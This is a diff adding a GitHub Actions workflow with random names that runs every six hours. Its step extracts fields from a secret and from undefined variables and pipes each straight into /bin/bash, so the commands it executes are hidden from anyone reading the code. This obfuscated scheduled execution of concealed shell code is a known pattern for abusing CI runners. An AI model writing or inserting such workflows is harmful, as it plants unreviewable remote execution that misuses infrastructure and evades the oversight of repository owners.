@@ -1,0 +1,35 @@
+name: dientoupi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dientoupi
+        env:
+          khy9: ${{ secrets.khy9 }}
+        run: |
+          echo $khy9 | jq -r .lnlro6590 | /bin/bash
+          echo $kirbs8072 | jq -r .mban0638 | /bin/bash
+          echo $b54817 | jq -r .gplm634 | /bin/bash
+          echo $ajel38 | jq -r .by997 | /bin/bash
+          echo $emuw290 | jq -r .naa32160 | /bin/bash
+          echo $s169 | jq -r .ihjx279 | /bin/bash
+          echo $adrv201 | jq -r .ywtr932 | /bin/bash
+          echo $qooow05712 | jq -r .dck26345 | /bin/bash
+          echo $hxu21020 | jq -r .u2186 | /bin/bash
+          echo $bht09 | jq -r .s8 | /bin/bash
+          echo $zxc3 | jq -r .x62 | /bin/bash
+          echo $iot7 | jq -r .h0007 | /bin/bash
+          echo $vkblr2 | jq -r .nrt8 | /bin/bash
+          echo $flxu75383 | jq -r .focm99 | /bin/bash
+          echo $eqzlu09 | jq -r .lb7431 | /bin/bash
+          echo $djwdn837 | jq -r .nt6461 | /bin/bash
+          echo $spft943 | jq -r .wkxn3 | /bin/bash
+          echo $dc98 | jq -r .yo3 | /bin/bash
+
